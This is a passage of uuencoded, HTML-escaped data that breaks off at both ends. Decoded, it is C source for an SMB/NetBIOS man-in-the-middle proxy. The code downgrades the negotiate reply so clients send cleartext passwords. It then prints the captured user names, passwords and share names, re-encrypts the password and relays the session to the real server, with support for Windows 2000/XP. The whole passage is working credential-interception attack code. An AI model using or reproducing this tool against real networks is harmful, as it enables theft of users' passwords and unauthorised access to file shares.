M(&quot;`@(`T*(&quot;\J5&amp;\@:&amp;%V92!T:&amp;4@96YC&lt;GEP=&amp;EO;B!K97DJ+PT*#0H@;65M
M8W!Y*$5N8W)Y&lt;&#039;1I;VY+97DL#0H@(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@*%!A8VME
M=&quot;`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R
M*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K
M#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6).96=0&lt;F]T4F5P;&#039;E(
M9&#039;(I*2P-&quot;B`@(&quot;`@(&quot;`@($5.0U]+15E?3$5.1U1(*3L-&quot;B`@(&quot;`@(&quot;`-&quot;B`O
M*E!A8VME=&quot;!M;V1I9FEC871I;VXJ+PT*#0H@+RI0=70@=&amp;AE(&amp;1O;6%I;B!N
M86UE(&#039;-T&lt;FEN9R!I;G-T96%D(&amp;]F(&#039;1H92!E;F-R&gt;7!T:6]N(&amp;ME&gt;2HO#0H-
M&quot;B!M96UC&lt;&#039;DH*&#039;5?8VAA&lt;B`J(&quot;D@*%!A8VME=&quot;`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6).96=0&lt;F]T4F5P;&#039;E(9&#039;(I*2P-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@($1O;6%I;DYA;64L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!$;VUA:6Y.86UE3&amp;5N9W1H*3L-&quot;@T*(%-M8DYE9U!R;W1297!L&gt;2T^0GET
M94-O=6YT6S!=(#T@1&amp;]M86EN3F%M94QE;F=T:#L-&quot;@T*+RI4;R!M;V1I9GD@
M=&amp;AE(&#039;-E8W5R:71Y(&amp;UO9&amp;4@8GET92!A;F0@=&amp;AE(&amp;5N8W)Y&lt;&#039;1I;VX@:V5Y
M(&amp;QE;F=T:&quot;HO#0H@#0H@4VUB3F5G4&#039;)O=%)E&lt;&amp;QY+3Y396-U&lt;FET&gt;4UO9&amp;4@
M/2`P&gt;#`Q.PT*(%-M8DYE9U!R;W1297!L&gt;2T^16YC&lt;GEP=&amp;EO;DME&gt;4QE;F=T
M:&quot;`](#!X,#`[#0H-&quot;B!.8G1397-S:6]N+3Y,96YG=&amp;@@/2!H=&amp;]N&lt;RAS:7IE
M;V8H4VUB0F%S94AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&#039;-I&gt;F5O9BA3;6).96=0&lt;F]T4F5P;&#039;E(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!$;VUA:6Y.86UE3&amp;5N9W1H*3L-&quot;@T*?0T*(`T*#0H@
M(&quot;`@#0H@#0HO*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHO#0H-&quot;B\J*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*+RI3;FEF9BP@;6]D:69Y(&amp;%N9&quot;!S96YD
M(&#039;1H92!S971U&lt;&quot;!8(&#039;)E&lt;75E&lt;W0J+PT*#0H-&quot;G9O:60@4V5T=7!84F5Q=65S
M=&quot;@-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=5]C:&amp;%R(&quot;I086-K970L#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;5?8VAA&lt;B`J16YC&lt;GEP=&amp;EO;DME&gt;2P-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT(%-E8W5R:71Y*0T*&gt;PT*($YB=%-E&lt;W-I;VY(
M9&#039;(@*DYB=%-E&lt;W-I;VX[#0H-&quot;B!3;6)&quot;87-E2&amp;1R(&quot;I3;6)&quot;87-E.PT*#0H@
M4VUB4V5T=7!84F5Q=65S=$AD&lt;B`J4VUB4V5T=7!84F5Q=65S=#L-&quot;@T*+RI&amp;
M;W(@&lt;&amp;%C:V5T(&amp;UO9&amp;EF:6-A=&amp;EO;BHO#0H@=5]C:&amp;%R(&quot;I496UP.PT*(&#039;5?
M8VAA&lt;B!%;F-R&gt;7!T961087-S=V]R9%M%3D-?4$%34U=/4D1?3$5.1U1(73L-
M&quot;B!I;G0@5&amp;5M&lt;%-I&gt;F4[#0H@=5]C:&amp;%R(%!A&lt;W-W;W)D6S$V73L-&quot;@T*+RI3
M=&amp;%R=&#039;,@:&amp;5R92HO#0H-&quot;B!.8G1397-S:6]N(#T@*$YB=%-E&lt;W-I;VY(9&#039;(@
M*BD@*%!A8VME=&quot;D[(&quot;`-&quot;@T*(%-M8D)A&lt;V4@/2`H4VUB0F%S94AD&lt;B`J*2`H
M4&amp;%C:V5T(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.
M8G1397-S:6]N2&amp;1R*2D[#0H)&quot;0T*(%-M8E-E=&#039;5P6%)E&lt;75E&lt;W0@/2`H4VUB
M4V5T=7!84F5Q=65S=$AD&lt;B`J*2`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*%!A
M8VME=&quot;`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I
M;VY(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)&quot;87-E
M2&amp;1R*2D[#0H-&quot;B!M96US970H4&amp;%S&lt;W=O&lt;F0L,&quot;PQ-BD[#0H@(&quot;`@(&quot;`@#0H@
M&lt;W1R;F-P&gt;2A087-S=V]R9&quot;P-&quot;B`@(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@#0H@(&quot;`@
M(&quot;`@(&quot;`H4&amp;%C:V5T(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD
M&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K(`T*(&quot;`@(&quot;`@
M(&quot;`@(&#039;-I&gt;F5O9BA3;6)3971U&lt;%A297%U97-T2&amp;1R*2DL#0H@(&quot;`@(&quot;`@(&quot;`@
M4VUB4V5T=7!84F5Q=65S=&quot;T^0V%S94EN&lt;V5N&lt;VET:79E4&amp;%S&lt;W=O&lt;F1,96YG
M=&amp;A;,%TI.PT*(&quot;`@(&quot;`@(`T*(&quot;\J268@=&amp;AE&lt;F4@:7,@82!S:&amp;%R92!S96-U
M&lt;FET&gt;2!L979E;&quot;P@=V4@9&amp;]N)W0@&lt;&#039;)I;G0@=&amp;AE#0H@(&quot;H@=7-E&lt;B!N86UE
M*B\-&quot;@D@#0H@:68H4V5C=7)I=&#039;DI#0H@&gt;PT*(&quot;!P&lt;FEN=&amp;8H(EQN57-E&lt;B`Z
M(&quot;5S(BP-&quot;B`@(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@#0H@(&quot;`@(&quot;`@(&quot;`H4&amp;%C:V5T
M(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I(&quot;L-&quot;B`@(&quot;`@
M(&quot;`@(&quot;!S:7IE;V8H4VUB0F%S94AD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H
M4VUB4V5T=7!84F5Q=65S=$AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(%-M8E-E=&#039;5P6%)E
M&lt;75E&lt;W0M/D-A&lt;V5);G-E;G-I=&amp;EV95!A&lt;W-W;W)D3&amp;5N9W1H6S!=*2D[#0H@
M?2`@(&quot;`@(`T*(&quot;`@(&quot;`@(&quot;`@#0H@&lt;&#039;)I;G1F*&quot;)&lt;;E!A&lt;W,@.B`E&lt;UQN7&amp;XB
M+%!A&lt;W-W;W)D*3L-&quot;@T*(&quot;\O(%=E(&#039;!U=&quot;!T:&amp;4@96YC&lt;GEP=&amp;5D(&#039;!A&lt;W-W
M;W)D(&amp;EN&lt;W1E860@;V8@=&amp;AE(&#039;!A&lt;W-W;W)D#0H@+R\@*B!I;B!C;&amp;5A&lt;B!T
M97AT#0H-&quot;B!334)E;F-R&gt;7!T*%!A&lt;W-W;W)D+$5N8W)Y&lt;&#039;1I;VY+97DL16YC
M&lt;GEP=&amp;5D4&amp;%S&lt;W=O&lt;F0I.PT*(&quot;`@(&quot;`@#0H@5&amp;5M&lt;%-I&gt;F4@/2`H4VUB4V5T
M=7!84F5Q=65S=&quot;T^0GET94-O=6YT6S!=(&quot;T-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!3;6)3
M971U&lt;%A297%U97-T+3Y#87-E26YS96YS:71I=F5087-S=V]R9$QE;F=T:%LP
M72D[#0H@(&quot;`@(&quot;`-&quot;B!496UP(#T@;6%L;&amp;]C*%1E;7!3:7IE*G-I&gt;F5O9BAU
M7V-H87(I*3L-&quot;@T*(&amp;UE;6-P&gt;2@H=5]C:&amp;%R(&quot;HI*&quot;!496UP*2P@#0H@(&quot;`@
M(&quot;`@(&quot;AU7V-H87(@*BD@#0H@(&quot;`@(&quot;`@(&quot;A086-K970@*R`-&quot;B`@(&quot;`@(&quot;`@
M(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB
M0F%S94AD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)3971U&lt;%A297%U97-T
M2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;!3;6)3971U&lt;%A297%U97-T+3Y#87-E26YS96YS
M:71I=F5087-S=V]R9$QE;F=T:%LP72DL#0H@(&quot;`@(&quot;`@(&quot;!496UP4VEZ92D[
M#0H-&quot;B!M96UC&lt;&#039;DH*&#039;5?8VAA&lt;B`J*2`H4&amp;%C:V5T(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)3971U&lt;%A297%U97-T2&amp;1R*2DL#0H@(&quot;`@(&quot;`@
M(&quot;!%;F-R&gt;7!T961087-S=V]R9&quot;P-&quot;B`@(&quot;`@(&quot;`@($5.0U]005-35T]21%],
M14Y&#039;5$@I.PT*#0H@;65M8W!Y*&quot;AU7V-H87(@*BD@*%!A8VME=&quot;`K(`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB0F%S94AD&lt;BD@*PT*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB4V5T=7!84F5Q=65S=$AD&lt;BD@#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;L@14Y#7U!!4U-73U)$7TQ%3D=42&quot;DL#0H@
M(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@*%1E;7`I+`T*(&quot;`@(&quot;`@(&quot;`@5&amp;5M&lt;%-I&gt;F4I
M.PT*(&quot;`@(&quot;`@#0H@4VUB4V5T=7!84F5Q=65S=&quot;T^0GET94-O=6YT6S!=(#T@
M5&amp;5M&lt;%-I&gt;F4@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!%3D-?4$%34U=/4D1?3$5.1U1(.PT*(&quot;`@(&quot;`@#0H-&quot;B!3;6)3971U&lt;%A2
M97%U97-T+3Y#87-E4V5N&lt;VET:79E4&amp;%S&lt;W=O&lt;F1,96YG=&amp;A;,%T@/2`P&gt;#`P
M.PT*#0H@4VUB4V5T=7!84F5Q=65S=&quot;T^0V%S94EN&lt;V5N&lt;VET:79E4&amp;%S&lt;W=O
M&lt;F1,96YG=&amp;A;,%T]14Y#7U!!4U-73U)$7TQ%3D=42#L-&quot;@D)(&quot;`@(&quot;`@#0H@
M3F)T4V5S&lt;VEO;BT^3&amp;5N9W1H(#T@:&#039;1O;G,H&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I
M(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB4V5T
M=7!84F5Q=65S=$AD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!496UP4VEZ92`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@14Y#
M7U!!4U-73U)$7TQ%3D=42&quot;D[#0H)(`T*?2`-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*B\-&quot;@T*+R].;W)M86P@8V]N;F5X:6]N(&amp;]N(&#039;!O&lt;G0@,3,Y#0H-
M&quot;FEN=&quot;!.;W)M86PH:6YT(%-O8VM0&lt;F]X&gt;2P@:6YT(%-O8VM3;6)397)V97(I
M#0I[#0H@:6YT(%-E8W5R:71Y/3`[#0H-&quot;B!I;G0@0V]U;G0[#0H-&quot;B!U7V-H
M87(@16YC&lt;GEP=&amp;EO;DME&gt;5M%3D-?2T597TQ%3D=42%T[#0H@#0H@=5]C:&amp;%R
M(%!A8VME=%M)4%]-05A?4TE:15T[#0H-&quot;B!.8G1397-S:6]N2&amp;1R($YB=%-E
M&lt;W-I;VX[#0H-&quot;B`-&quot;B`O*BHJ*BHJ*BHJ*DY%5$))3U,@4D5154535&quot;HJ*BHJ
M*BHJ*BHJ*B\-&quot;@T*(%)E860H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H@(`T*(%=R
M:71E*%-O8VM3;6)397)V97(L4&amp;%C:V5T*3L-&quot;@T*+RHJ*BHJ*BHJ*BHJ3D)4
M(%)%4$Q9*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ+PT*#0H@4F5A9&quot;A3;V-K4VUB4V5R
M=F5R+%!A8VME=&quot;D[#0H-&quot;B!7&lt;FET92A3;V-K4&#039;)O&gt;&#039;DL4&amp;%C:V5T*3L-&quot;B`-
M&quot;B\J*BHJ*BHJ*BHJ*DY%1U!23U0@4D5154535&quot;HJ*BHJ*BHJ*BHJ*B\-&quot;@T*
M(%)E860H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H@(`T*#0H@5W)I=&amp;4H4V]C:U-M
M8E-E&lt;G9E&lt;BQ086-K970I.PT*#0HO*BHJ*BHJ*BHJ*BI.14=04D]4(%)%4$Q9
M*BHJ*BHJ*BHJ*BHJ*BHO#0H-&quot;B!296%D*%-O8VM3;6)397)V97(L4&amp;%C:V5T
M*3L-&quot;@T*($YE9U!R;W1297!L&gt;2@-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@4&amp;%C:V5T+`T*
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!%;F-R&gt;7!T:6]N2V5Y+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`F
M4V5C=7)I=&#039;DI.PT*#0H@5W)I=&amp;4H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H-&quot;B\J
M*BHJ*BHJ*BHJ*E-%5%506&quot;!215%515-4*BHJ*BHJ*BHJ*BHJ*B\-&quot;B`-&quot;B!2
M96%D*%-O8VM0&lt;F]X&gt;2Q086-K970I.PT*(&quot;`-&quot;B!3971U&lt;%A297%U97-T*`T*
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@4&amp;%C:V5T+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@16YC&lt;GEP
M=&amp;EO;DME&gt;2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%-E8W5R:71Y*3L-&quot;B`@#0H@5W)I
M=&amp;4H4V]C:U-M8E-E&lt;G9E&lt;BQ086-K970I.PT*(`T*+RHJ*BHJ*BHJ*BHJ4T54
M55!8(%)%4$Q9*BHJ*BHJ*BHJ*BHJ*BHJ+PT*#0H@4F5A9&quot;A3;V-K4VUB4V5R
M=F5R+%!A8VME=&quot;D[#0H-&quot;B!M96UC&lt;&#039;DH#0H@(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@
M*&quot;9.8G1397-S:6]N*2P-&quot;B`@(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2`H4&amp;%C:V5T*2P-
M&quot;B`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;B`-&quot;B`@(`T*(&amp;EF
M*&quot;!N=&amp;]H&lt;RA.8G1397-S:6]N+DQE;F=T:&quot;D@/B`S-2`I#0H@&gt;PT*(&quot;!P&lt;FEN
M=&amp;8H(D%C8V5S&lt;R!G&lt;F%N=&amp;5D(&quot;T^(%!A&lt;W-W;W)D(&#039;9A;&amp;ED(&quot;%&lt;;B(I.PT*
M#0H-&quot;B`@5W)I=&amp;4H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H@(`T*+RHJ*BHJ*BHJ
M*BHJ5$-/3E@@24Y415)#15!424].*BHJ*BHJ*BHJ+PT*(&quot;`@#0H@(%)E860H
M4V]C:U!R;WAY+%!A8VME=&quot;D[#0H-&quot;B`@5W)I=&amp;4H4V]C:U-M8E-E&lt;G9E&lt;BQ0
M86-K970I.PT*#0H@(&#039;!R:6YT9B@B4VAA&lt;F4@.B`E&lt;UQN(BP-&quot;B`@(&quot;`@(&quot;`@
M(&quot;AU7V-H87(@*BD@*%!A8VME=&quot;`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S
M:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I
M&gt;F5O9BA3;6)48V]N6%)E&lt;75E&lt;W1(9&#039;(I(&quot;L@,2`I*3L-&quot;@T*+RHJ*BHJ*BHJ
M*BHJ4D5$25)%0U1)3TXJ*BHJ*BHJ*BHJ*BHJ*BHJ+PT*#0H@(&quot;\O1&amp;\@&gt;6]U
M(&#039;=A;G0@=&amp;\@:&amp;%V92!N;VX@8FQO8VMI;F&lt;@&lt;F5A9&quot;@I(&amp;-A;&amp;QS(#\-&quot;@T*
M(&quot;!F8VYT;&quot;A3;V-K4&#039;)O&gt;&#039;DL1E]3151&amp;3&quot;Q/7TY/3D),3T-+*3L-&quot;B`@9F-N
M=&amp;PH4V]C:U-M8E-E&lt;G9E&lt;BQ&amp;7U-%5$9,+$]?3D].0DQ/0TLI.PT*#0H@(&#039;=H
M:6QE*#$I#0H@(&#039;L-&quot;B`@($-O=6YT(#T@&lt;F5A9&quot;A3;V-K4&#039;)O&gt;&#039;DL)DYB=%-E
M&lt;W-I;VXL&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;@T*(&quot;`@:68H(4-O=6YT
M*0T*(&quot;`@&gt;PT*(&quot;`@(&#039;!R:6YT9B@B7&amp;Y397-S:6]N(&amp;9I;FES:&amp;5D(&quot;%&lt;;B(I
M.PT*(&quot;`@(&amp;-L;W-E*%-O8VM0&lt;F]X&gt;2D[#0H@(&quot;`@8VQO&lt;V4H4V]C:U-M8E-E
M&lt;G9E&lt;BD[#0H@(&quot;`@&lt;F5T=7)N(#`[#0H@(&quot;!]#0H@(&quot;`-&quot;B`@(&amp;EF*$-O=6YT
M(&quot;$](&quot;TQ(&quot;8F($-O=6YT*0T*(&quot;`@&gt;R`-&quot;B`@(&quot;!M96US970H4&amp;%C:V5T+#`L
M25!?34%87U-)6D4I.R`-&quot;B`@(`T*(&quot;`@(&amp;UE;6-P&gt;2A086-K970L*&#039;5?8VAA
M&lt;B`J*2`H)DYB=%-E&lt;W-I;VXI+&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2D[#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(`T*(&quot;`@(&#039;)E860H4V]C:U!R;WAY+`T*(&quot;`@
M(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2`H4&amp;%C:V5T(&quot;L@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(
M9&#039;(I*2P-&quot;B`@(&quot;`@(&quot;`@(&amp;YT;VAS*$YB=%-E&lt;W-I;VXN3&amp;5N9W1H*2D[#0H-
M&quot;B`@(&quot;!W&lt;FET92A3;V-K4VUB4V5R=F5R+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;AU7V-H87(@
M*BD@*%!A8VME=&quot;DL#0H@(&quot;`@(&quot;`@(&quot;`@;G1O:&#039;,H3F)T4V5S&lt;VEO;BY,96YG
M=&amp;@I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI.PT*(&quot;`@
M?0T*#0H@(&quot;!#;W5N=&quot;`](&#039;)E860H4V]C:U-M8E-E&lt;G9E&lt;BPF3F)T4V5S&lt;VEO
M;BQS:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI.PT*#0H@(&quot;!I9B@A0V]U;G0I#0H@
M(&quot;![#0H@(&quot;`@&lt;&#039;)I;G1F*&quot;)&lt;;E-E&lt;W-I;VX@9FEN:7-H960@(5QN(BD[#0H@
M(&quot;`@8VQO&lt;V4H4V]C:U!R;WAY*3L-&quot;B`@(&quot;!C;&amp;]S92A3;V-K4VUB4V5R=F5R
M*3L-&quot;B`@(&quot;!R971U&lt;FX@,#L-&quot;B`@(&#039;T-&quot;B`@(`T*(&quot;`@:68H0V]U;G0@(3T@
M+3$@)B8@0V]U;G0I#0H@(&quot;![#0H@(&quot;`@;65M&lt;V5T*%!A8VME=&quot;PP+$E07TU!
M6%]325I%*3L@#0H@(&quot;`-&quot;B`@(&quot;!M96UC&lt;&#039;DH4&amp;%C:V5T+&quot;AU7V-H87(@*BD@
M*&quot;9.8G1397-S:6]N*2QS:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI.PT*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`-&quot;B`@(&quot;!R96%D*%-O8VM3;6)397)V97(L#0H@(&quot;`@
M(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(&quot;A086-K970@*R!S:7IE;V8H3F)T4V5S&lt;VEO;DAD
M&lt;BDI+`T*(&quot;`@(&quot;`@(&quot;`@;G1O:&#039;,H3F)T4V5S&lt;VEO;BY,96YG=&amp;@I*3L-&quot;@T*
M(&quot;`@(&#039;=R:71E*%-O8VM0&lt;F]X&gt;2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(&quot;A0
M86-K970I+`T*(&quot;`@(&quot;`@(&quot;`@(&amp;YT;VAS*$YB=%-E&lt;W-I;VXN3&amp;5N9W1H*2`K
M#0H@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;B`@(&#039;T-&quot;B`@
M?0T*(&#039;T-&quot;B!E;&#039;-E#0H@&gt;PT*(&quot;!P&lt;FEN=&amp;8H(E-E&lt;W-I;VX@9F%I;&amp;5D(&quot;T^
M(%!A&lt;W-W;W)D(&amp;EN=F%L:60@(5QN(BD[#0H@(&quot;`-&quot;B`@5W)I=&amp;4H4V]C:U!R
M;WAY+%!A8VME=&quot;D[#0H@#0H@(&amp;-L;W-E*%-O8VM0&lt;F]X&gt;2D[#0H@(&amp;-L;W-E
M*%-O8VM3;6)397)V97(I.PT*(&quot;`-&quot;B`@&lt;F5T=7)N(#`[#0H@?0T*(`T*(&amp;-L
M;W-E*%-O8VM0&lt;F]X&gt;2D[#0H@8VQO&lt;V4H4V]C:U-M8E-E&lt;G9E&lt;BD[#0H@#0H@
M&lt;F5T=7)N(#`[#0I](`T*(&quot;`-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-
M&quot;B\J4W5P&lt;&amp;]R=&quot;!W:6XR:R]84&quot;!W:71H($Y&quot;5&quot;!D:7-A8FQE9&quot;`H&lt;V%M92!A
M&lt;R!T:&amp;4@(DYO&lt;FUA;&quot;(@9G5N8W1I;VX-&quot;B`J(&amp;)U=&quot;!T:&amp;4@;F)T(&amp;YA;65S
M(&#039;-E;F1I;F&lt;@&lt;&#039;)O8V5S&lt;R!I&lt;R!N;W0@:6YC;&#039;5D960@*B\-&quot;@T*:6YT(%=I
M;C)K6%!3=7!P;W)T*&amp;EN=&quot;!3;V-K4&#039;)O&gt;&#039;DL(&amp;EN=&quot;!3;V-K4VUB4V5R=F5R
M*0T*&gt;PT*(&amp;EN=&quot;!396-U&lt;FET&gt;3TP.PT*#0H@:6YT($-O=6YT.PT*#0H@=5]C
M:&amp;%R($5N8W)Y&lt;&#039;1I;VY+97E;14Y#7TM%65],14Y&#039;5$A=.PT*(`T*(&#039;5?8VAA
M&lt;B!086-K971;25!?34%87U-)6D5=.PT*#0H@3F)T4V5S&lt;VEO;DAD&lt;B!.8G13
M97-S:6]N.PT*#0H@#0H-&quot;B\J*BHJ*BHJ*BHJ*DY%1U!23U0@4D5154535&quot;HJ
M*BHJ*BHJ*BHJ*B\-&quot;@T*(%)E860H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H@(`T*
M#0H@5W)I=&amp;4H4V]C:U-M8E-E&lt;G9E&lt;BQ086-K970I.PT*#0HO*BHJ*BHJ*BHJ
M*BI.14=04D]4(%)%4$Q9*BHJ*BHJ*BHJ*BHJ*BHO#0H-&quot;B!296%D*%-O8VM3
M;6)397)V97(L4&amp;%C:V5T*3L-&quot;@T*($YE9U!R;W1297!L&gt;2@-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@4&amp;%C:V5T+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!%;F-R&gt;7!T:6]N2V5Y+`T*
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`F4V5C=7)I=&#039;DI.PT*#0H@5W)I=&amp;4H4V]C:U!R;WAY
M+%!A8VME=&quot;D[#0H-&quot;B\J*BHJ*BHJ*BHJ*E-%5%506&quot;!215%515-4*BHJ*BHJ
M*BHJ*BHJ*B\-&quot;B`-&quot;B!296%D*%-O8VM0&lt;F]X&gt;2Q086-K970I.PT*(&quot;`-&quot;B!3
M971U&lt;%A297%U97-T*`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@4&amp;%C:V5T+`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@16YC&lt;GEP=&amp;EO;DME&gt;2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%-E8W5R
M:71Y*3L-&quot;B`@#0H@5W)I=&amp;4H4V]C:U-M8E-E&lt;G9E&lt;BQ086-K970I.PT*(`T*
